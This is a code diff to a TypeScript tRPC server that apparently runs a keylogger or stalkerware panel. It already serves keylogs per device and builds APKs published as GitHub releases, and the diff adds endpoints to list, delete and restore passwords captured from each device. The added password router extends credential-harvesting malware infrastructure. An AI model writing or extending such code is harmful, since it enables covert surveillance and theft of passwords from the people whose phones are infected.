@@ -8,7 +8,7 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl, updateAPKBuildDownloadUrl, deleteAllAPKBuildsByUser, getAPKBuildByFilename } from './db';
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl, updateAPKBuildDownloadUrl, deleteAllAPKBuildsByUser, getAPKBuildByFilename, savePassword, getPasswordsByDevice, deletePassword, restorePassword, getDeletedPasswords } from './db';
 import { sdk } from "./_core/sdk";
 import { generateRealAPK } from "./apk-generator-real";
 import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";
@@ -83,6 +83,29 @@ export const appRouter = router({
       .input(z.object({ keylogId: z.number() }))
       .mutation(async ({ input }) => {
         return await restoreKeylog(input.keylogId);
+      }),
+  }),
+
+  passwords: router({
+    list: protectedProcedure
+      .input(z.object({ deviceId: z.string() }))
+      .query(async ({ input }) => {
+        return await getPasswordsByDevice(input.deviceId);
+      }),
+    deleted: protectedProcedure
+      .input(z.object({ deviceId: z.string() }))
+      .query(async ({ input }) => {
+        return await getDeletedPasswords(input.deviceId);
+      }),
+    delete: protectedProcedure
+      .input(z.object({ passwordId: z.number() }))
+      .mutation(async ({ input }) => {
+        return await deletePassword(input.passwordId);
+      }),
+    restore: protectedProcedure
+      .input(z.object({ passwordId: z.number() }))
+      .mutation(async ({ input }) => {
+        return await restorePassword(input.passwordId);
       }),
   }),
 
